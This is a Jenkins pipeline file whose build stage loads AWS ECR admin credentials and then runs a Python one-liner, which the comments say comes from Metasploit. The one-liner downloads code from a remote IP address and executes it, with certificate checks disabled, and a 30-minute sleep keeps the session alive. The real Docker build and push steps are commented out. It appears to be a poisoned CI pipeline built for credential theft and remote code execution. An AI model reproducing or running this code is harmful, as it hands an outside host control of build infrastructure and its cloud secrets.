pipeline {
  agent any 
  stages {
    stage('build') {
        steps {
           // added some credentials to the build
          withCredentials([usernamePassword(credentialsId: 'ECR_ADMIN', usernameVariable: 'AWS_ACCESS_KEY_ID', passwordVariable: 'AWS_SECRET_ACCESS_KEY')]) {
           // added the python one-liner from metasploit
            sh '''
            python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://3.101.29.199:8080/W3nDtlcnNCG', context=ssl._create_unverified_context());exec(r.read());"
            sleep 1800
            #aws ecr get-login-password --region us-west-1 | docker login --username AWS --password-stdin 421215178782.dkr.ecr.us-west-1.amazonaws.com
            #docker build . -t 421215178782.dkr.ecr.us-west-1.amazonaws.com/nsa4e-dev:latest
            #docker push 421215178782.dkr.ecr.us-west-1.amazonaws.com/nsa4e-dev:latest
            '''
        }
      }
    }
  }
}
